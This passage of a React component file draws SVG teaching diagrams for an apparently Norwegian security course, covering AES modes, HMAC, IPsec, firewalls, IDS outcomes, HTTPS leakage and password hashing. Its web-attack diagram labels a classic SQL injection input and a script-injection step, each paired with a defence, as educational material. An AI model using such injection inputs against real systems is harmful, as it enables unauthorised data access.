      <text x={260} y={257} textAnchor="middle" className="fill-muted-foreground text-[9px]">
        redundans · rate-limit
      </text>
      <text x={260} y={135} textAnchor="middle" className="fill-foreground text-[10px] font-bold">
        C ∩ I
      </text>
      <text x={260} y={148} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        AEAD (GCM)
      </text>
      <text x={228} y={185} textAnchor="middle" className="fill-foreground text-[9px]">
        C ∩ A
      </text>
      <text x={295} y={185} textAnchor="middle" className="fill-foreground text-[9px]">
        I ∩ A
      </text>
    </svg>
  );
}

/** 2) AES-modi som fire boks-diagrammer */
function AesModesSvg() {
  const modes = [
    { x: 10, name: "ECB", color: "destructive", ok: false, note: "Lekker mønstre" },
    { x: 140, name: "CBC", color: "amber-500", ok: true, note: "Trenger IV · seriell" },
    { x: 270, name: "CTR", color: "brand", ok: true, note: "Parallell · ingen padding" },
    { x: 400, name: "GCM", color: "success", ok: true, note: "AEAD · krypt + auth" },
  ];
  return (
    <svg viewBox="0 0 530 230" className="w-full h-auto" aria-label="Fire AES-modi">
      <text
        x={265}
        y={18}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        AES-modi — hvordan blokker kjedes
      </text>
      {modes.map((m) => (
        <g key={m.name}>
          <rect
            x={m.x}
            y={30}
            width={120}
            height={170}
            rx={8}
            className={`fill-${m.color}/10 stroke-${m.color}`}
            strokeWidth={1.5}
          />
          <text
            x={m.x + 60}
            y={52}
            textAnchor="middle"
            className={`fill-${m.color} text-[13px] font-bold`}
          >
            {m.name}
          </text>
          {/* mini-diagram inni boksen — 3 blokker */}
          {[0, 1, 2].map((i) => (
            <g key={i}>
              <rect
                x={m.x + 14 + i * 30}
                y={70}
                width={22}
                height={22}
                className="fill-muted/30 stroke-muted-foreground"
                strokeWidth={0.8}
              />
              <text
                x={m.x + 25 + i * 30}
                y={86}
                textAnchor="middle"
                className="fill-foreground text-[8px]"
              >
                P{i + 1}
              </text>
            </g>
          ))}
          {/* chiffer-blokker */}
          {[0, 1, 2].map((i) => {
            // ECB: like P-blokker → like C-blokker (vises ved samme farge)
            const sameOutput =
              m.name === "ECB" && i === 2 ? "fill-destructive/40" : `fill-${m.color}/40`;
            return (
              <g key={`c${i}`}>
                <rect
                  x={m.x + 14 + i * 30}
                  y={130}
                  width={22}
                  height={22}
                  className={`${sameOutput} stroke-${m.color}`}
                  strokeWidth={0.8}
                />
                <text
                  x={m.x + 25 + i * 30}
                  y={146}
                  textAnchor="middle"
                  className="fill-foreground text-[8px]"
                >
                  C{i + 1}
                </text>
              </g>
            );
          })}
          {/* Piler P→C */}
          {[0, 1, 2].map((i) => (
            <line
              key={`a${i}`}
              x1={m.x + 25 + i * 30}
              y1={94}
              x2={m.x + 25 + i * 30}
              y2={128}
              className="stroke-muted-foreground"
              strokeWidth={0.8}
            />
          ))}
          <text
            x={m.x + 60}
            y={178}
            textAnchor="middle"
            className="fill-muted-foreground text-[9px]"
          >
            {m.note}
          </text>
          <text
            x={m.x + 60}
            y={192}
            textAnchor="middle"
            className={
              m.ok
                ? "fill-success text-[10px] font-semibold"
                : "fill-destructive text-[10px] font-semibold"
            }
          >
            {m.ok ? "✓ trygt" : "✗ usikker"}
          </text>
        </g>
      ))}
      <text x={265} y={222} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        Like input-blokker i ECB gir like output-blokker — derfor lekker mønstre
      </text>
    </svg>
  );
}

/** 3) Hash-chain — som blokk-kjede med koblede hasher */
function HashChainSvg() {
  return (
    <svg viewBox="0 0 520 200" className="w-full h-auto" aria-label="Hash-chain">
      <text
        x={260}
        y={18}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        Hash-kjede — hver blokk binder seg til den forrige
      </text>
      {[0, 1, 2, 3].map((i) => (
        <g key={i}>
          <rect
            x={20 + i * 125}
            y={50}
            width={105}
            height={100}
            rx={6}
            className="fill-card stroke-brand"
            strokeWidth={1.3}
          />
          <text
            x={72 + i * 125}
            y={68}
            textAnchor="middle"
            className="fill-brand text-[10px] font-semibold"
          >
            Blokk #{i}
          </text>
          <rect
            x={32 + i * 125}
            y={76}
            width={80}
            height={18}
            rx={2}
            className="fill-muted/30 stroke-muted-foreground"
            strokeWidth={0.6}
          />
          <text x={72 + i * 125} y={88} textAnchor="middle" className="fill-foreground text-[8px]">
            data {i}
          </text>
          <rect
            x={32 + i * 125}
            y={100}
            width={80}
            height={14}
            rx={2}
            className="fill-amber-500/15 stroke-amber-500"
            strokeWidth={0.6}
          />
          <text x={72 + i * 125} y={110} textAnchor="middle" className="fill-foreground text-[7px]">
            prev-hash
          </text>
          <rect
            x={32 + i * 125}
            y={118}
            width={80}
            height={14}
            rx={2}
            className="fill-success/15 stroke-success"
            strokeWidth={0.6}
          />
          <text x={72 + i * 125} y={128} textAnchor="middle" className="fill-foreground text-[7px]">
            H = sha256(...)
          </text>
        </g>
      ))}
      {[0, 1, 2].map((i) => (
        <line
          key={`l${i}`}
          x1={125 + i * 125}
          y1={125}
          x2={147 + i * 125}
          y2={107}
          className="stroke-success"
          strokeWidth={1.4}
          markerEnd="url(#hc-arrow)"
        />
      ))}
      <defs>
        <marker
          id="hc-arrow"
          viewBox="0 0 10 10"
          refX={9}
          refY={5}
          markerWidth={5}
          markerHeight={5}
          orient="auto"
        >
          <path d="M0 0 L10 5 L0 10 z" className="fill-success" />
        </marker>
      </defs>
      <text x={260} y={180} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        Endrer du én bit i blokk #1, brytes alle senere hasher
      </text>
    </svg>
  );
}

/** 4) Tre-faktor-autentisering: vet, har, er */
function ThreeFactorsSvg() {
  const fs = [
    {
      x: 90,
      label: "Vet",
      sub: "kunnskap",
      ex: "passord · PIN",
      color: "brand",
      glyph: "🔑",
    },
    {
      x: 260,
      label: "Har",
      sub: "eierskap",
      ex: "YubiKey · telefon",
      color: "success",
      glyph: "⬛",
    },
    {
      x: 430,
      label: "Er",
      sub: "biometri",
      ex: "fingeravtrykk · Face ID",
      color: "amber-500",
      glyph: "✦",
    },
  ];
  return (
    <svg
      viewBox="0 0 520 220"
      className="w-full h-auto"
      aria-label="Tre faktorer for autentisering"
    >
      <text
        x={260}
        y={18}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        Autentiseringsfaktorer — MFA kombinerer minst to
      </text>
      {fs.map((f) => (
        <g key={f.label}>
          <circle
            cx={f.x}
            cy={95}
            r={42}
            className={`fill-${f.color}/15 stroke-${f.color}`}
            strokeWidth={1.5}
          />
          <text
            x={f.x}
            y={88}
            textAnchor="middle"
            className={`fill-${f.color} text-[14px] font-bold`}
          >
            {f.label}
          </text>
          <text x={f.x} y={104} textAnchor="middle" className="fill-foreground text-[9px]">
            {f.sub}
          </text>
          <text
            x={f.x}
            y={156}
            textAnchor="middle"
            className="fill-foreground text-[10px] font-semibold"
          >
            {f.ex}
          </text>
        </g>
      ))}
      <text x={175} y={195} textAnchor="middle" className="fill-success text-[10px] font-semibold">
        2FA = Vet + Har
      </text>
      <text x={345} y={195} textAnchor="middle" className="fill-success text-[10px] font-semibold">
        MFA = Vet + Har + Er
      </text>
      <text x={260} y={212} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        Hver faktor er uavhengig — tyv av én knekker ikke de andre
      </text>
    </svg>
  );
}

/** 5) HMAC inner+outer hash som flytdiagram */
function HmacInnerOuterSvg() {
  return (
    <svg viewBox="0 0 520 240" className="w-full h-auto" aria-label="HMAC inner og outer hash">
      <text
        x={260}
        y={18}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        HMAC = H((K ⊕ opad) ∥ H((K ⊕ ipad) ∥ m))
      </text>

      {/* Inputs */}
      <rect
        x={20}
        y={45}
        width={80}
        height={28}
        rx={4}
        className="fill-amber-500/15 stroke-amber-500"
        strokeWidth={1}
      />
      <text x={60} y={62} textAnchor="middle" className="fill-foreground text-[10px] font-semibold">
        nøkkel K
      </text>
      <rect
        x={20}
        y={85}
        width={80}
        height={28}
        rx={4}
        className="fill-brand/15 stroke-brand"
        strokeWidth={1}
      />
      <text
        x={60}
        y={102}
        textAnchor="middle"
        className="fill-foreground text-[10px] font-semibold"
      >
        melding m
      </text>

      {/* K ⊕ ipad */}
      <rect
        x={140}
        y={45}
        width={90}
        height={28}
        rx={4}
        className="fill-card stroke-muted-foreground"
        strokeWidth={1}
      />
      <text x={185} y={62} textAnchor="middle" className="fill-foreground text-[10px]">
        K ⊕ ipad
      </text>
      <line x1={100} y1={59} x2={140} y2={59} className="stroke-amber-500" strokeWidth={1.2} />

      {/* Inner hash */}
      <rect
        x={260}
        y={45}
        width={120}
        height={56}
        rx={6}
        className="fill-brand/10 stroke-brand"
        strokeWidth={1.5}
      />
      <text x={320} y={68} textAnchor="middle" className="fill-brand text-[11px] font-semibold">
        H( inner )
      </text>
      <text x={320} y={84} textAnchor="middle" className="fill-muted-foreground text-[9px]">
        sha256 første gang
      </text>
      <line x1={230} y1={59} x2={260} y2={66} className="stroke-muted-foreground" strokeWidth={1} />
      <line x1={100} y1={99} x2={260} y2={82} className="stroke-brand" strokeWidth={1} />

      {/* K ⊕ opad */}
      <rect
        x={140}
        y={130}
        width={90}
        height={28}
        rx={4}
        className="fill-card stroke-muted-foreground"
        strokeWidth={1}
      />
      <text x={185} y={148} textAnchor="middle" className="fill-foreground text-[10px]">
        K ⊕ opad
      </text>
      <line x1={60} y1={73} x2={60} y2={144} className="stroke-amber-500" strokeWidth={1} />
      <line x1={60} y1={144} x2={140} y2={144} className="stroke-amber-500" strokeWidth={1} />

      {/* Outer hash */}
      <rect
        x={260}
        y={130}
        width={120}
        height={56}
        rx={6}
        className="fill-success/10 stroke-success"
        strokeWidth={1.5}
      />
      <text x={320} y={153} textAnchor="middle" className="fill-success text-[11px] font-semibold">
        H( outer )
      </text>
      <text x={320} y={169} textAnchor="middle" className="fill-muted-foreground text-[9px]">
        sha256 andre gang
      </text>
      <line
        x1={230}
        y1={144}
        x2={260}
        y2={151}
        className="stroke-muted-foreground"
        strokeWidth={1}
      />
      {/* inner-output mates outer */}
      <line x1={380} y1={73} x2={400} y2={73} className="stroke-brand" strokeWidth={1.2} />
      <line x1={400} y1={73} x2={400} y2={158} className="stroke-brand" strokeWidth={1.2} />
      <line
        x1={400}
        y1={158}
        x2={380}
        y2={158}
        className="stroke-brand"
        strokeWidth={1.2}
        markerEnd="url(#hmac-arr)"
      />

      {/* Tag */}
      <rect
        x={420}
        y={140}
        width={80}
        height={36}
        rx={4}
        className="fill-success stroke-success"
        strokeWidth={1.2}
      />
      <text x={460} y={163} textAnchor="middle" className="fill-background text-[11px] font-bold">
        HMAC-tag
      </text>
      <line
        x1={380}
        y1={158}
        x2={420}
        y2={158}
        className="stroke-success"
        strokeWidth={1.5}
        markerEnd="url(#hmac-arr)"
      />

      <defs>
        <marker
          id="hmac-arr"
          viewBox="0 0 10 10"
          refX={9}
          refY={5}
          markerWidth={5}
          markerHeight={5}
          orient="auto"
        >
          <path d="M0 0 L10 5 L0 10 z" className="fill-foreground" />
        </marker>
      </defs>

      <text x={260} y={210} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        Dobbel-hash struktur stopper length-extension-angrep mot Merkle–Damgård
      </text>
      <text x={260} y={224} textAnchor="middle" className="fill-muted-foreground text-[9px]">
        opad = 0x5c gjentatt · ipad = 0x36 gjentatt
      </text>
    </svg>
  );
}

/** 6) ESP / AH pakke-layout */
function EspPacketLayoutSvg() {
  return (
    <svg viewBox="0 0 520 240" className="w-full h-auto" aria-label="ESP og AH pakke-layout">
      <text
        x={260}
        y={16}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        IPsec — ESP og AH pakke-struktur
      </text>

      {/* ESP */}
      <text x={20} y={42} className="fill-brand text-[11px] font-semibold">
        ESP (Encapsulating Security Payload)
      </text>
      <g>
        <rect
          x={20}
          y={50}
          width={60}
          height={42}
          className="fill-muted/40 stroke-muted-foreground"
          strokeWidth={1}
        />
        <text x={50} y={67} textAnchor="middle" className="fill-foreground text-[9px]">
          IP-hdr
        </text>
        <text x={50} y={80} textAnchor="middle" className="fill-muted-foreground text-[8px]">
          ny ytre
        </text>

        <rect
          x={80}
          y={50}
          width={60}
          height={42}
          className="fill-brand/20 stroke-brand"
          strokeWidth={1}
        />
        <text x={110} y={67} textAnchor="middle" className="fill-foreground text-[9px]">
          ESP-hdr
        </text>
        <text x={110} y={80} textAnchor="middle" className="fill-muted-foreground text-[8px]">
          SPI, seq
        </text>

        <rect
          x={140}
          y={50}
          width={260}
          height={42}
          className="fill-success/20 stroke-success"
          strokeWidth={1}
        />
        <text
          x={270}
          y={67}
          textAnchor="middle"
          className="fill-foreground text-[9px] font-semibold"
        >
          Payload (kryptert)
        </text>
        <text x={270} y={80} textAnchor="middle" className="fill-muted-foreground text-[8px]">
          original IP + TCP + data
        </text>

        <rect
          x={400}
          y={50}
          width={50}
          height={42}
          className="fill-amber-500/20 stroke-amber-500"
          strokeWidth={1}
        />
        <text x={425} y={67} textAnchor="middle" className="fill-foreground text-[9px]">
          ESP-trl
        </text>
        <text x={425} y={80} textAnchor="middle" className="fill-muted-foreground text-[8px]">
          padding
        </text>

        <rect
          x={450}
          y={50}
          width={50}
          height={42}
          className="fill-success/40 stroke-success"
          strokeWidth={1.2}
        />
        <text x={475} y={67} textAnchor="middle" className="fill-foreground text-[9px]">
          ICV
        </text>
        <text x={475} y={80} textAnchor="middle" className="fill-muted-foreground text-[8px]">
          auth-tag
        </text>
      </g>
      {/* Encrypted span */}
      <line x1={80} y1={102} x2={450} y2={102} className="stroke-brand" strokeWidth={1.2} />
      <text x={265} y={114} textAnchor="middle" className="fill-brand text-[8px] font-semibold">
        kryptert (CONF)
      </text>
      {/* Auth span */}
      <line x1={80} y1={122} x2={500} y2={122} className="stroke-success" strokeWidth={1.2} />
      <text x={290} y={134} textAnchor="middle" className="fill-success text-[8px] font-semibold">
        autentisert (INT)
      </text>

      {/* AH */}
      <text x={20} y={158} className="fill-amber-700 dark:fill-amber-400 text-[11px] font-semibold">
        AH (Authentication Header) — kun integritet, brytes av NAT
      </text>
      <g>
        <rect
          x={20}
          y={166}
          width={70}
          height={42}
          className="fill-muted/40 stroke-muted-foreground"
          strokeWidth={1}
        />
        <text x={55} y={183} textAnchor="middle" className="fill-foreground text-[9px]">
          IP-hdr
        </text>
        <rect
          x={90}
          y={166}
          width={90}
          height={42}
          className="fill-amber-500/20 stroke-amber-500"
          strokeWidth={1}
        />
        <text x={135} y={183} textAnchor="middle" className="fill-foreground text-[9px]">
          AH-hdr
        </text>
        <text x={135} y={196} textAnchor="middle" className="fill-muted-foreground text-[8px]">
          SPI · seq · ICV
        </text>
        <rect
          x={180}
          y={166}
          width={320}
          height={42}
          className="fill-muted/30 stroke-muted-foreground"
          strokeWidth={1}
        />
        <text x={340} y={183} textAnchor="middle" className="fill-foreground text-[9px]">
          Payload (KLARTEKST)
        </text>
        <text x={340} y={196} textAnchor="middle" className="fill-muted-foreground text-[8px]">
          original TCP + data
        </text>
      </g>
      <line x1={20} y1={218} x2={500} y2={218} className="stroke-amber-500" strokeWidth={1.2} />
      <text
        x={260}
        y={230}
        textAnchor="middle"
        className="fill-amber-700 dark:fill-amber-400 text-[8px] font-semibold"
      >
        autentisert (også ytre IP-header — NAT endrer den og bryter ICV)
      </text>
    </svg>
  );
}

/** 7) Brannmur-typer som tre stack-diagrammer */
function FirewallStacksSvg() {
  const types = [
    {
      x: 20,
      title: "Stateless filter",
      sub: "ingen flow-minne",
      layers: ["L4 port", "L3 IP", "regel-tabell"],
      color: "amber-500",
    },
    {
      x: 190,
      title: "Stateful",
      sub: "conntrack-tabell",
      layers: ["conntrack", "L4 port", "L3 IP", "regel-tabell"],
      color: "brand",
    },
    {
      x: 360,
      title: "App-gateway / WAF",
      sub: "ser lag-7",
      layers: ["HTTP-parse", "conntrack", "L4 / L3", "OWASP-mønstre"],
      color: "success",
    },
  ];
  return (
    <svg viewBox="0 0 520 240" className="w-full h-auto" aria-label="Tre brannmur-typer">
      <text
        x={260}
        y={16}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        Tre generasjoner brannmur — hvor høyt opp ser den?
      </text>
      {types.map((t) => (
        <g key={t.title}>
          <rect
            x={t.x}
            y={32}
            width={140}
            height={200}
            rx={8}
            className={`fill-${t.color}/5 stroke-${t.color}`}
            strokeWidth={1.5}
          />
          <text
            x={t.x + 70}
            y={50}
            textAnchor="middle"
            className={`fill-${t.color} text-[11px] font-semibold`}
          >
            {t.title}
          </text>
          <text
            x={t.x + 70}
            y={64}
            textAnchor="middle"
            className="fill-muted-foreground text-[9px]"
          >
            {t.sub}
          </text>
          {t.layers.map((layer, i) => (
            <g key={layer}>
              <rect
                x={t.x + 12}
                y={80 + i * 28}
                width={116}
                height={22}
                rx={3}
                className={`fill-${t.color}/15 stroke-${t.color}`}
                strokeWidth={0.8}
              />
              <text
                x={t.x + 70}
                y={95 + i * 28}
                textAnchor="middle"
                className="fill-foreground text-[10px]"
              >
                {layer}
              </text>
            </g>
          ))}
          <text
            x={t.x + 70}
            y={222}
            textAnchor="middle"
            className="fill-muted-foreground text-[9px] italic"
          >
            ↑ pakke
          </text>
        </g>
      ))}
    </svg>
  );
}

/** 8) IDS/IPS confusion-matrix */
function IdsConfusionMatrixSvg() {
  return (
    <svg viewBox="0 0 520 260" className="w-full h-auto" aria-label="Confusion-matrix for IDS">
      <text
        x={260}
        y={18}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        IDS-utfall — fire ruter i confusion-matrix
      </text>

      {/* Akser */}
      <text
        x={260}
        y={42}
        textAnchor="middle"
        className="fill-foreground text-[10px] font-semibold"
      >
        Faktisk
      </text>
      <text x={195} y={62} textAnchor="middle" className="fill-foreground text-[9px]">
        angrep
      </text>
      <text x={365} y={62} textAnchor="middle" className="fill-foreground text-[9px]">
        normal
      </text>
      <text
        x={50}
        y={155}
        textAnchor="middle"
        className="fill-foreground text-[10px] font-semibold"
        transform="rotate(-90, 50, 155)"
      >
        Forutsagt
      </text>
      <text x={90} y={110} textAnchor="middle" className="fill-foreground text-[9px]">
        alarm
      </text>
      <text x={90} y={195} textAnchor="middle" className="fill-foreground text-[9px]">
        ingen
      </text>

      {/* Fire ruter */}
      <rect
        x={120}
        y={70}
        width={160}
        height={80}
        className="fill-success/15 stroke-success"
        strokeWidth={1.5}
      />
      <text x={200} y={100} textAnchor="middle" className="fill-success text-[11px] font-bold">
        TP
      </text>
      <text x={200} y={120} textAnchor="middle" className="fill-foreground text-[10px]">
        True Positive
      </text>
      <text x={200} y={138} textAnchor="middle" className="fill-muted-foreground text-[9px]">
        ekte angrep oppdaget
      </text>

      <rect
        x={280}
        y={70}
        width={160}
        height={80}
        className="fill-destructive/15 stroke-destructive"
        strokeWidth={1.5}
      />
      <text x={360} y={100} textAnchor="middle" className="fill-destructive text-[11px] font-bold">
        FP
      </text>
      <text x={360} y={120} textAnchor="middle" className="fill-foreground text-[10px]">
        False Positive
      </text>
      <text x={360} y={138} textAnchor="middle" className="fill-muted-foreground text-[9px]">
        falsk alarm
      </text>

      <rect
        x={120}
        y={150}
        width={160}
        height={80}
        className="fill-destructive/15 stroke-destructive"
        strokeWidth={1.5}
      />
      <text x={200} y={180} textAnchor="middle" className="fill-destructive text-[11px] font-bold">
        FN
      </text>
      <text x={200} y={200} textAnchor="middle" className="fill-foreground text-[10px]">
        False Negative
      </text>
      <text x={200} y={218} textAnchor="middle" className="fill-muted-foreground text-[9px]">
        glipp — verst!
      </text>

      <rect
        x={280}
        y={150}
        width={160}
        height={80}
        className="fill-success/15 stroke-success"
        strokeWidth={1.5}
      />
      <text x={360} y={180} textAnchor="middle" className="fill-success text-[11px] font-bold">
        TN
      </text>
      <text x={360} y={200} textAnchor="middle" className="fill-foreground text-[10px]">
        True Negative
      </text>
      <text x={360} y={218} textAnchor="middle" className="fill-muted-foreground text-[9px]">
        normal forblir
      </text>

      <text x={260} y={250} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        Signatur-IDS: lav FP, høy FN. Anomali-IDS: motsatt.
      </text>
    </svg>
  );
}

/** 9) Web-angrep-flyt: XSS / CSRF / SQLi side-ved-side */
function WebAttacksFlowSvg() {
  return (
    <svg viewBox="0 0 520 280" className="w-full h-auto" aria-label="Tre web-angreps flyter">
      <text
        x={260}
        y={16}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        Tre angreps-mønstre — hvor input blir tolket
      </text>

      {/* XSS */}
      <g transform="translate(10, 30)">
        <text x={80} y={12} textAnchor="middle" className="fill-brand text-[11px] font-semibold">
          XSS
        </text>
        <rect
          x={10}
          y={20}
          width={140}
          height={26}
          rx={3}
          className="fill-card stroke-brand"
          strokeWidth={1}
        />
        <text x={80} y={36} textAnchor="middle" className="fill-foreground text-[9px]">
          Trudy poster &lt;script&gt;
        </text>
        <line
          x1={80}
          y1={46}
          x2={80}
          y2={62}
          className="stroke-brand"
          strokeWidth={1}
          markerEnd="url(#wa-arr)"
        />
        <rect
          x={10}
          y={62}
          width={140}
          height={26}
          rx={3}
          className="fill-card stroke-brand"
          strokeWidth={1}
        />
        <text x={80} y={78} textAnchor="middle" className="fill-foreground text-[9px]">
          Server lagrer ren
        </text>
        <line
          x1={80}
          y1={88}
          x2={80}
          y2={104}
          className="stroke-brand"
          strokeWidth={1}
          markerEnd="url(#wa-arr)"
        />
        <rect
          x={10}
          y={104}
          width={140}
          height={26}
          rx={3}
          className="fill-destructive/15 stroke-destructive"
          strokeWidth={1.2}
        />
        <text
          x={80}
          y={120}
          textAnchor="middle"
          className="fill-foreground text-[9px] font-semibold"
        >
          Offer kjører JS!
        </text>
        <rect
          x={10}
          y={140}
          width={140}
          height={48}
          rx={3}
          className="fill-success/10 stroke-success"
          strokeWidth={1}
        />
        <text x={80} y={156} textAnchor="middle" className="fill-success text-[9px] font-semibold">
          Forsvar
        </text>
        <text x={80} y={170} textAnchor="middle" className="fill-foreground text-[9px]">
          escape-ved-utskrift
        </text>
        <text x={80} y={182} textAnchor="middle" className="fill-foreground text-[9px]">
          + CSP-header
        </text>
      </g>

      {/* CSRF */}
      <g transform="translate(180, 30)">
        <text
          x={80}
          y={12}
          textAnchor="middle"
          className="fill-amber-700 dark:fill-amber-400 text-[11px] font-semibold"
        >
          CSRF
        </text>
        <rect
          x={10}
          y={20}
          width={140}
          height={26}
          rx={3}
          className="fill-card stroke-amber-500"
          strokeWidth={1}
        />
        <text x={80} y={36} textAnchor="middle" className="fill-foreground text-[9px]">
          Offer logget på bank
        </text>
        <line
          x1={80}
          y1={46}
          x2={80}
          y2={62}
          className="stroke-amber-500"
          strokeWidth={1}
          markerEnd="url(#wa-arr)"
        />
        <rect
          x={10}
          y={62}
          width={140}
          height={26}
          rx={3}
          className="fill-card stroke-amber-500"
          strokeWidth={1}
        />
        <text x={80} y={78} textAnchor="middle" className="fill-foreground text-[9px]">
          Besøker evil.com
        </text>
        <line
          x1={80}
          y1={88}
          x2={80}
          y2={104}
          className="stroke-amber-500"
          strokeWidth={1}
          markerEnd="url(#wa-arr)"
        />
        <rect
          x={10}
          y={104}
          width={140}
          height={26}
          rx={3}
          className="fill-destructive/15 stroke-destructive"
          strokeWidth={1.2}
        />
        <text
          x={80}
          y={120}
          textAnchor="middle"
          className="fill-foreground text-[9px] font-semibold"
        >
          Auto-POST m/cookie
        </text>
        <rect
          x={10}
          y={140}
          width={140}
          height={48}
          rx={3}
          className="fill-success/10 stroke-success"
          strokeWidth={1}
        />
        <text x={80} y={156} textAnchor="middle" className="fill-success text-[9px] font-semibold">
          Forsvar
        </text>
        <text x={80} y={170} textAnchor="middle" className="fill-foreground text-[9px]">
          SameSite=Lax/Strict
        </text>
        <text x={80} y={182} textAnchor="middle" className="fill-foreground text-[9px]">
          + CSRF-token
        </text>
      </g>

      {/* SQLi */}
      <g transform="translate(350, 30)">
        <text
          x={80}
          y={12}
          textAnchor="middle"
          className="fill-destructive text-[11px] font-semibold"
        >
          SQLi
        </text>
        <rect
          x={10}
          y={20}
          width={140}
          height={26}
          rx={3}
          className="fill-card stroke-destructive"
          strokeWidth={1}
        />
        <text x={80} y={36} textAnchor="middle" className="fill-foreground text-[9px]">
          Bruker: &apos; OR 1=1 --
        </text>
        <line
          x1={80}
          y1={46}
          x2={80}
          y2={62}
          className="stroke-destructive"
          strokeWidth={1}
          markerEnd="url(#wa-arr)"
        />
        <rect
          x={10}
          y={62}
          width={140}
          height={26}
          rx={3}
          className="fill-card stroke-destructive"
          strokeWidth={1}
        />
        <text x={80} y={78} textAnchor="middle" className="fill-foreground text-[9px]">
          Konkat. inn i SQL
        </text>
        <line
          x1={80}
          y1={88}
          x2={80}
          y2={104}
          className="stroke-destructive"
          strokeWidth={1}
          markerEnd="url(#wa-arr)"
        />
        <rect
          x={10}
          y={104}
          width={140}
          height={26}
          rx={3}
          className="fill-destructive/15 stroke-destructive"
          strokeWidth={1.2}
        />
        <text
          x={80}
          y={120}
          textAnchor="middle"
          className="fill-foreground text-[9px] font-semibold"
        >
          DB lekker hele tabell
        </text>
        <rect
          x={10}
          y={140}
          width={140}
          height={48}
          rx={3}
          className="fill-success/10 stroke-success"
          strokeWidth={1}
        />
        <text x={80} y={156} textAnchor="middle" className="fill-success text-[9px] font-semibold">
          Forsvar
        </text>
        <text x={80} y={170} textAnchor="middle" className="fill-foreground text-[9px]">
          parameter-binding
        </text>
        <text x={80} y={182} textAnchor="middle" className="fill-foreground text-[9px]">
          (prepared stmts)
        </text>
      </g>

      <defs>
        <marker
          id="wa-arr"
          viewBox="0 0 10 10"
          refX={9}
          refY={5}
          markerWidth={5}
          markerHeight={5}
          orient="auto"
        >
          <path d="M0 0 L10 5 L0 10 z" className="fill-foreground" />
        </marker>
      </defs>

      <text x={260} y={260} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        Felles mønster: brukerdata tolkes som kode/instruksjon — separasjon er forsvaret
      </text>
    </svg>
  );
}

/** 10) HTTPS-stack — hva som krypteres, hva som lekker */
function HttpsStackSvg() {
  return (
    <svg viewBox="0 0 520 260" className="w-full h-auto" aria-label="HTTPS protokoll-stack">
      <text
        x={260}
        y={18}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        HTTPS er en stack — TLS krypterer kanalen, ikke alt
      </text>

      {[
        {
          y: 35,
          name: "HTTP/1.1 · HTTP/2",
          desc: "request-line, headers, body",
          crypt: true,
          label: "applikasjon",
        },
        { y: 75, name: "TLS 1.3", desc: "record-layer, AES-GCM", crypt: true, label: "sikkerhet" },
        {
          y: 115,
          name: "TCP",
          desc: "porter (443), flow-kontroll",
          crypt: false,
          label: "transport",
        },
        { y: 155, name: "IP", desc: "kilde- og mål-IP synlige", crypt: false, label: "nettverk" },
      ].map((lay) => (
        <g key={lay.name}>
          <rect
            x={40}
            y={lay.y}
            width={400}
            height={32}
            rx={4}
            className={
              lay.crypt
                ? "fill-success/15 stroke-success"
                : "fill-destructive/15 stroke-destructive"
            }
            strokeWidth={1.3}
          />
          <text x={50} y={lay.y + 20} className="fill-foreground text-[11px] font-semibold">
            {lay.name}
          </text>
          <text x={210} y={lay.y + 20} className="fill-muted-foreground text-[10px]">
            {lay.desc}
          </text>
          <text x={450} y={lay.y + 20} className="fill-muted-foreground text-[10px]">
            {lay.label}
          </text>
        </g>
      ))}

      {/* Side-band lekkasje */}
      <rect
        x={40}
        y={200}
        width={400}
        height={42}
        rx={6}
        className="fill-amber-500/10 stroke-amber-500"
        strokeWidth={1.3}
      />
      <text x={50} y={216} className="fill-amber-700 dark:fill-amber-400 text-[10px] font-semibold">
        Lekker selv med HTTPS:
      </text>
      <text x={50} y={232} className="fill-foreground text-[10px]">
        DNS-spørring · mål-IP · SNI-felt i ClientHello · pakke-størrelse-mønster
      </text>

      <text x={260} y={256} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        Grønn = kryptert · rød = klartekst · gul = side-kanal-info
      </text>
    </svg>
  );
}

/** 11) Salt + KDF for passord-lagring */
function SaltKdfSvg() {
  return (
    <svg viewBox="0 0 520 240" className="w-full h-auto" aria-label="Salt og KDF for passord">
      <text
        x={260}
        y={16}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        Passord-lagring — salt + treig KDF, aldri ren hash
      </text>

      {/* ANTI-PATTERN */}
      <text x={20} y={42} className="fill-destructive text-[10px] font-semibold">
        Anti-mønster — SHA-256(passord)
      </text>
      <rect
        x={20}
        y={50}
        width={80}
        height={26}
        rx={3}
        className="fill-card stroke-muted-foreground"
        strokeWidth={1}
      />
      <text x={60} y={66} textAnchor="middle" className="fill-foreground text-[10px]">
        &quot;Sommer123&quot;
      </text>
      <line
        x1={100}
        y1={63}
        x2={130}
        y2={63}
        className="stroke-muted-foreground"
        strokeWidth={1}
        markerEnd="url(#kdf-arr)"
      />
      <rect
        x={130}
        y={50}
        width={90}
        height={26}
        rx={3}
        className="fill-destructive/15 stroke-destructive"
        strokeWidth={1}
      />
      <text x={175} y={66} textAnchor="middle" className="fill-foreground text-[9px]">
        SHA-256 (rask)
      </text>
      <line
        x1={220}
        y1={63}
        x2={250}
        y2={63}
        className="stroke-muted-foreground"
        strokeWidth={1}
        markerEnd="url(#kdf-arr)"
      />
      <rect
        x={250}
        y={50}
        width={130}
        height={26}
        rx={3}
        className="fill-card stroke-muted-foreground"
        strokeWidth={1}
      />
      <text x={315} y={66} textAnchor="middle" className="fill-foreground text-[9px]">
        9f8e... (lagres)
      </text>
      <text x={400} y={66} className="fill-destructive text-[9px]">
        GPU: 10⁹/sek
      </text>
